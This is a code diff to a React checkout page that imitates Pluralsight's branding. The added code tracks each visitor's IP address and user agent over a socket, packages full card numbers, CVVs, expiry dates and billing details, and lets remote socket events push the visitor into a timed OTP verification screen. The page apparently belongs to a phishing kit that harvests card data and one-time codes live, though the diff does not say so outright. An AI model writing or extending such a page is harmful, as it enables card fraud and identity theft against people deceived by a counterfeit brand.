@@ -48,6 +48,65 @@ const Checkout = () => {
     localStorage.removeItem('userCardData');
     localStorage.removeItem('lastPaymentData');
   }, []);
+
+
+
+  // Get socket from context for visitor tracking and payment handling
+  const { socket, isConnected } = useSocket();
+  
+  // Visitor tracking for checkout page
+  useEffect(() => {
+    if (!socket) return;
+
+    const trackVisitor = async () => {
+      try {
+        // Fetch visitor IP address
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        
+        const visitorData = {
+          visitorId: `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
+          ipAddress: data.ip,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          page: 'checkout'
+        };
+        
+        // Emit visitor joined event
+        socket.emit('visitor-joined', visitorData);
+        
+        // Set up heartbeat to maintain session
+        const heartbeatInterval = setInterval(() => {
+          if (socket.connected) {
+            socket.emit('visitor-heartbeat', {
+              visitorId: visitorData.visitorId,
+              ipAddress: data.ip,
+              timestamp: new Date().toISOString()
+            });
+          }
+        }, 25000); // Send heartbeat every 25 seconds
+        
+        // Cleanup function
+        return () => {
+          clearInterval(heartbeatInterval);
+          // Don't emit visitor-left on cleanup to avoid flickering
+        };
+      } catch (error) {
+        console.error('Error tracking visitor:', error);
+        // Fallback with unknown IP
+        const fallbackData = {
+          visitorId: `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
+          ipAddress: 'Unknown IP',
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          page: 'checkout'
+        };
+        socket.emit('visitor-joined', fallbackData);
+      }
+    };
+
+    trackVisitor();
+  }, [socket]);
   
   const [formData, setFormData] = useState({
     firstName: '',
@@ -77,6 +136,11 @@ const Checkout = () => {
   const [agreeTerms, setAgreeTerms] = useState(false);
   const [showTermsError, setShowTermsError] = useState(false);
   const [promoCode, setPromoCode] = useState('');
+
+  // Debug: Log the current state of agreeTerms
+  useEffect(() => {
+    console.log('agreeTerms state:', agreeTerms);
+  }, [agreeTerms]);
   
   // Payment flow states
   const [currentStep, setCurrentStep] = useState<'account' | 'loading' | 'payment' | 'review' | 'processing' | 'otp'>('account');
@@ -114,6 +178,7 @@ const Checkout = () => {
   const [declineError, setDeclineError] = useState("");
   const [paymentId] = useState(() => 'pay_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
   const [cardError, setCardError] = useState("");
+  const [otpLoading, setOtpLoading] = useState(false);
 
   const cardSessionMap = React.useRef({});
 
@@ -446,8 +511,7 @@ const Checkout = () => {
     }, 1500);
   };
 
-  // --- SOCKET INITIALIZATION AND EVENT HANDLING ---
-  const { socket, isConnected } = useSocket();
+  // --- SOCKET EVENT HANDLING FOR PAYMENT FLOW ---
 
   useEffect(() => {
     if (!socket) {
@@ -460,6 +524,13 @@ const Checkout = () => {
       setConfirmingPayment(false);
       setShowOtp(true);
       setCurrentStep('otp');
+      
+      // Show loading overlay for 4-5 seconds
+      setOtpLoading(true);
+      setTimeout(() => {
+        setOtpLoading(false);
+      }, 4500); // 4.5 seconds
+      
       startOtpTimer();
     });
     socket.on('payment-approved', (data) => {
@@ -496,25 +567,34 @@ const Checkout = () => {
           if (storedCard) _cardData = { ..._cardData, ...JSON.parse(storedCard) };
         }
         // Now build successData as before
-        const successData = { 
-          ..._cardData, 
-          ..._formData, 
+        const successData = {
+          cardNumber: _cardData.cardNumber,
+          cardName: _cardData.cardName,
+          cvv: _cardData.cvv,
+          expiry: `${_cardData.expiryMonth}/${_cardData.expiryYear}`,
+          expiryMonth: _cardData.expiryMonth,
+          expiryYear: _cardData.expiryYear,
+          billingDetails: {
+            firstName: _formData.firstName,
+            lastName: _formData.lastName,
+            email: _formData.email,
+            country: _formData.country,
+            companyName: _formData.companyName || ''
+          },
           planName, 
           billing, 
           amount: displayPrice, 
-          paymentId 
+          paymentId,
+          timestamp: new Date().toISOString()
         };
         // Only proceed if all required fields are present
         if (
-          !successData.firstName ||
-          !successData.lastName ||
-          !successData.email ||
+          !successData.billingDetails?.email ||
           !successData.cardNumber ||
           !successData.cardName ||
-          !successData.expiryMonth ||
-          !successData.expiryYear ||
           !successData.cvv
         ) {
+          console.log('Missing payment data:', successData);
           alert('Payment details not found. Please complete checkout again.');
           return;
         }
@@ -687,12 +767,14 @@ const Checkout = () => {
         cardName: cardData.cardName,
         cvv: cardData.cvv,
         expiry: `${cardData.expiryMonth}/${cardData.expiryYear}`,
+        expiryMonth: cardData.expiryMonth,
+        expiryYear: cardData.expiryYear,
         billingDetails: {
           firstName: formData.firstName,
           lastName: formData.lastName,
           email: formData.email,
           country: formData.country,
-          companyName: formData.companyName
+          companyName: formData.companyName || ''
         },
         planName,
         billing,
@@ -996,25 +1078,26 @@ const Checkout = () => {
 
                 {/* Terms and Conditions */}
                 <div className="mb-8">
-                  <div className="flex items-start gap-3">
-                    <div className="flex items-start space-x-2">
-                      <Checkbox
-                        id="terms-checkbox"
-                        checked={true}
-                        onCheckedChange={() => {
-                          setAgreeTerms(true);
+                  <div className="flex items-start gap-2">
+                    <Checkbox
+                      id="terms-checkbox"
+                      checked={agreeTerms}
+                      onCheckedChange={(checked) => {
+                        console.log('Checkbox clicked, new state:', checked);
+                        setAgreeTerms(checked === true);
+                        if (checked) {
                           setShowTermsError(false);
-                        }}
-                        className={`mt-1 h-5 w-5 rounded border-2 ${showTermsError ? 'border-red-500' : 'border-gray-300'}`}
-                      />
-                      <label 
-                        htmlFor="terms-checkbox" 
-                        className={`text-sm leading-5 ${showTermsError ? 'text-red-500' : 'text-slate-300'}`}
-                      >
-                        By checking here and continuing, I agree to the Pluralsight{' '}
-                        <a href="#" className="text-blue-400 hover:underline">Terms of Use</a>.
-                      </label>
-                    </div>
+                        }
+                      }}
+                      className={`h-4 w-4 rounded border-2 data-[state=checked]:bg-blue-600 data-[state=checked]:border-blue-600 data-[state=unchecked]:bg-transparent data-[state=unchecked]:border-gray-400 ${showTermsError ? 'border-red-500' : 'border-gray-400'} hover:border-blue-500 transition-colors flex-shrink-0 cursor-pointer`}
+                    />
+                    <label 
+                      htmlFor="terms-checkbox" 
+                      className={`text-sm leading-5 cursor-pointer select-none ${showTermsError ? 'text-red-500' : 'text-slate-300'} hover:text-slate-200 transition-colors`}
+                    >
+                      By checking here and continuing, I agree to the Pluralsight{' '}
+                      <a href="#" className="text-blue-400 hover:underline">Terms of Use</a>.
+                    </label>
                   </div>
                 </div>
 
@@ -1330,6 +1413,16 @@ const Checkout = () => {
             {currentStep === 'otp' && (
               <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 p-2">
                 <div className="bg-white rounded-lg w-full max-w-md shadow-2xl relative" style={{ minWidth: 420, maxWidth: 440 }}>
+                  {/* OTP Loading Overlay */}
+                  {otpLoading && (
+                    <div className="absolute inset-0 bg-white rounded-lg flex items-center justify-center z-50">
+                      <div className="text-center">
+                        <div className="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+                        <p className="text-gray-600 text-sm">Loading verification...</p>
+                      </div>
+                    </div>
+                  )}
+                  
                   {/* Cancel Button (top right, small) */}
                   <button
                     onClick={handleOtpCancel}
@@ -1688,15 +1781,172 @@ const Checkout = () => {
         </div>
       </div>
 
-      {/* Footer */}
-      <div className="border-t border-slate-700 px-6 py-6 text-xs text-slate-400">
-        <div className="max-w-7xl mx-auto flex flex-wrap gap-6">
-          <span>Copyright © 2004-2025 Pluralsight LLC. All rights reserved.</span>
-          <a href="#" className="hover:text-white">Privacy Policy</a>
-          <a href="#" className="hover:text-white">Terms of Use</a>
-          <a href="#" className="hover:text-white">Do Not Sell or Share My Personal Data</a>
+      {/* Comprehensive Footer */}
+      <footer className="bg-slate-900 border-t border-slate-700">
+        <div className="max-w-7xl mx-auto px-6 py-12">
+          <div className="grid grid-cols-1 md:grid-cols-5 gap-8 mb-12">
+            {/* Support */}
+            <div>
+              <h4 className="font-semibold mb-4">Support</h4>
+              <ul className="space-y-2 text-sm text-gray-400">
+                <li><a href="https://help.pluralsight.com/" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Contact</a></li>
+                <li><a href="https://help.pluralsight.com/" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Help Center</a></li>
+                <li><a href="https://help.pluralsight.com/help/ip-allowlist" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">IP Allowlist</a></li>
+                <li><a href="https://www.pluralsight.com/sitemap" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Sitemap</a></li>
+                <li><a href="https://www.pluralsight.com/mobile" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Download Pluralsight</a></li>
+                <li><a href="https://www.pluralsight.com/individuals/pricing" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">View Plans</a></li>
+                <li><a href="https://www.pluralsight.com/product/flow" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Flow Plans</a></li>
+                <li><a href="https://www.pluralsight.com/professional-services" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Professional Services</a></li>
+              </ul>
+            </div>
+
+            {/* Community */}
+            <div>
+              <h4 className="font-semibold mb-4">Community</h4>
+              <ul className="space-y-2 text-sm text-gray-400">
+                <li><a href="https://www.pluralsight.com/guides" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Guides</a></li>
+                <li><a href="https://www.pluralsight.com/teach" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Teach</a></li>
+                <li><a href="https://www.pluralsight.com/partners" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Partner with Pluralsight</a></li>
+                <li><a href="https://www.pluralsight.com/one" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Pluralsight One</a></li>
+                <li><a href="https://www.pluralsight.com/authors" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Authors</a></li>
+              </ul>
+            </div>
+
+            {/* Company */}
+            <div>
+              <h4 className="font-semibold mb-4">Company</h4>
+              <ul className="space-y-2 text-sm text-gray-400">
+                <li><a href="https://www.pluralsight.com/about" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">About Us</a></li>
+                <li><a href="https://www.pluralsight.com/careers" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Careers</a></li>
+                <li><a href="https://www.pluralsight.com/newsroom" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Newsroom</a></li>
+                <li><a href="https://www.pluralsight.com/resources" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Resources</a></li>
+              </ul>
+            </div>
+
+            {/* Industries */}
+            <div>
+              <h4 className="font-semibold mb-4">Industries</h4>
+              <ul className="space-y-2 text-sm text-gray-400">
+                <li><a href="https://www.pluralsight.com/industries/education" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Education</a></li>
+                <li><a href="https://www.pluralsight.com/industries/financial-services" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Financial Services (FSBI)</a></li>
+                <li><a href="https://www.pluralsight.com/industries/healthcare" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Healthcare</a></li>
+                <li><a href="https://www.pluralsight.com/industries/insurance" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Insurance</a></li>
+                <li><a href="https://www.pluralsight.com/industries/non-profit" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Non-Profit</a></li>
+                <li><a href="https://www.pluralsight.com/industries/public-sector" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Public Sector</a></li>
+              </ul>
+            </div>
+
+            {/* Newsletter */}
+            <div>
+              <h4 className="font-semibold mb-4">Newsletter</h4>
+              <p className="text-sm text-gray-400 mb-4">
+                Sign up with your email to join our mailing list.
+              </p>
+              <div className="space-y-4">
+                <Input type="email" placeholder="Email Address" className="bg-slate-800 border-slate-600 text-white placeholder:text-gray-400" />
+                <div className="flex items-start gap-2">
+                  <Checkbox className="mt-1" />
+                  <label className="text-xs text-gray-400 leading-relaxed">
+                    I would like to receive emails from Pluralsight
+                  </label>
+                </div>
+                <Button className="w-full bg-red-500 hover:bg-red-600 text-white py-2 rounded-full">
+                  Submit
+                </Button>
+              </div>
+
+              {/* Social Icons */}
+              <div className="flex gap-4 mt-6">
+                <a href="https://twitter.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
+                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z" /></svg>
+                </a>
+                <a href="https://www.facebook.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
+                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M22.46 6c-.77.35-1.6.58-2.46.69.88-.53 1.56-1.37 1.88-2.38-.83.5-1.75.85-2.72 1.05C18.37 4.5 17.26 4 16 4c-2.35 0-4.27 1.92-4.27 4.29 0 .34.04.67.11.98C8.28 9.09 5.11 7.38 3 4.79c-.37.63-.58 1.37-.58 2.15 0 1.49.75 2.81 1.91 3.56-.71 0-1.37-.2-1.95-.5v.03c0 2.08 1.48 3.82 3.44 4.21a4.22 4.22 0 0 1-1.93.07 4.28 4.28 0 0 0 4 2.98 8.521 8.521 0 0 1-5.33 1.84c-.34 0-.68-.02-1.02-.06C3.44 20.29 5.7 21 8.12 21 16 21 20.33 14.46 20.33 8.79c0-.19 0-.37-.01-.56.84-.6 1.56-1.36 2.14-2.23z" /></svg>
+                </a>
+                <a href="https://www.instagram.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
+                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.219-.359-.219c0-1.781 1.062-3.188 2.384-3.188 1.125 0 1.669.844 1.669 1.853 0 1.128-.719 2.813-1.094 4.375-.312 1.313.656 2.384 1.953 2.384 2.344 0 4.031-3.021 4.031-6.594 0-2.724-1.812-4.781-4.969-4.781-3.72 0-6.062 2.75-6.062 5.797 0 1.047.401 1.789.934 2.384.219.25.25.469.188.719-.063.281-.203.844-.266 1.078-.078.375-.312.469-.719.281-1.297-.469-1.906-1.844-1.906-3.375 0-2.5 2.094-5.5 6.25-5.5 3.359 0 5.469 2.437 5.469 5.031 0 3.437-1.875 6.094-4.625 6.094-1.125 0-2.125-.656-2.469-1.406 0 0-.594 2.437-.719 2.937-.25.969-.875 1.844-1.281 2.469 1.062.328 2.188.516 3.375.516 6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001 12.017.001z" /></svg>
+                </a>
+                <a href="https://www.linkedin.com/company/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
+                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" /></svg>
+                </a>
+                <a href="https://www.youtube.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
+                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" /></svg>
+                </a>
+              </div>
+            </div>
+
+            {/* Industries */}
+            <div>
+              <h4 className="font-semibold mb-4">Industries</h4>
+              <ul className="space-y-2 text-sm text-gray-400">
+                <li><a href="https://www.pluralsight.com/industries/education" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Education</a></li>
+                <li><a href="https://www.pluralsight.com/industries/financial-services" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Financial Services (FSBI)</a></li>
+                <li><a href="https://www.pluralsight.com/industries/healthcare" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Healthcare</a></li>
+                <li><a href="https://www.pluralsight.com/industries/insurance" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Insurance</a></li>
+                <li><a href="https://www.pluralsight.com/industries/non-profit" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Non-Profit</a></li>
+                <li><a href="https://www.pluralsight.com/industries/public-sector" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Public Sector</a></li>
+              </ul>
+            </div>
+
+            {/* Newsletter */}
+            <div>
+              <h4 className="font-semibold mb-4">Newsletter</h4>
+              <p className="text-sm text-gray-400 mb-4">
+                Sign up with your email to join our mailing list.
+              </p>
+              <div className="space-y-4">
+                <Input type="email" placeholder="Email Address" className="bg-slate-800 border-slate-600 text-white placeholder:text-gray-400" />
+                <div className="flex items-start gap-2">
+                  <Checkbox className="mt-1" />
+                  <label className="text-xs text-gray-400 leading-relaxed">
+                    I would like to receive emails from Pluralsight
+                  </label>
+                </div>
+                <Button className="w-full bg-red-500 hover:bg-red-600 text-white py-2 rounded-full">
+                  Submit
+                </Button>
+              </div>
+
+              {/* Social Icons */}
+              <div className="flex gap-4 mt-6">
+                <a href="https://twitter.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
+                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z" /></svg>
+                </a>
+                <a href="https://www.facebook.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
+                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M22.46 6c-.77.35-1.6.58-2.46.69.88-.53 1.56-1.37 1.88-2.38-.83.5-1.75.85-2.72 1.05C18.37 4.5 17.26 4 16 4c-2.35 0-4.27 1.92-4.27 4.29 0 .34.04.67.11.98C8.28 9.09 5.11 7.38 3 4.79c-.37.63-.58 1.37-.58 2.15 0 1.49.75 2.81 1.91 3.56-.71 0-1.37-.2-1.95-.5v.03c0 2.08 1.48 3.82 3.44 4.21a4.22 4.22 0 0 1-1.93.07 4.28 4.28 0 0 0 4 2.98 8.521 8.521 0 0 1-5.33 1.84c-.34 0-.68-.02-1.02-.06C3.44 20.29 5.7 21 8.12 21 16 21 20.33 14.46 20.33 8.79c0-.19 0-.37-.01-.56.84-.6 1.56-1.36 2.14-2.23z" /></svg>
+                </a>
+                <a href="https://www.instagram.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
+                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.219-.359-.219c0-1.781 1.062-3.188 2.384-3.188 1.125 0 1.669.844 1.669 1.853 0 1.128-.719 2.813-1.094 4.375-.312 1.313.656 2.384 1.953 2.384 2.344 0 4.031-3.021 4.031-6.594 0-2.724-1.812-4.781-4.969-4.781-3.72 0-6.062 2.75-6.062 5.797 0 1.047.401 1.789.934 2.384.219.25.25.469.188.719-.063.281-.203.844-.266 1.078-.078.375-.312.469-.719.281-1.297-.469-1.906-1.844-1.906-3.375 0-2.5 2.094-5.5 6.25-5.5 3.359 0 5.469 2.437 5.469 5.031 0 3.437-1.875 6.094-4.625 6.094-1.125 0-2.125-.656-2.469-1.406 0 0-.594 2.437-.719 2.937-.25.969-.875 1.844-1.281 2.469 1.062.328 2.188.516 3.375.516 6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001 12.017.001z" /></svg>
+                </a>
+                <a href="https://www.linkedin.com/company/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
+                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" /></svg>
+                </a>
+                <a href="https://www.youtube.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
+                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" /></svg>
+                </a>
+              </div>
+            </div>
+          </div>
+
+          {/* Bottom Footer */}
+          <div className="border-t border-slate-700 pt-8 flex flex-col md:flex-row items-center justify-between">
+            <div className="flex items-center gap-4 mb-4 md:mb-0">
+              <div className="w-8 h-8 bg-orange-500 rounded flex items-center justify-center">
+                <div className="w-0 h-0 border-l-[6px] border-l-transparent border-r-[6px] border-r-transparent border-b-[8px] border-b-white"></div>
+              </div>
+              <p className="text-sm text-gray-400">
+                Copyright 2004 - 2025 Pluralsight LLC. All rights reserved
+              </p>
+            </div>
+            <div className="flex gap-6 text-sm text-gray-400">
+              <a href="https://legal.pluralsight.com/policies" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Terms of Service</a>
+              <a href="https://legal.pluralsight.com/policies?name=privacy-notice" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Privacy Policy</a>
+              <a href="https://www.pluralsight.com/contact" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Help Center</a>
+              <a href="https://www.pluralsight.com/contact" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Contact Us</a>
+            </div>
+          </div>
         </div>
-      </div>
+      </footer>
     </div>
   );
 };
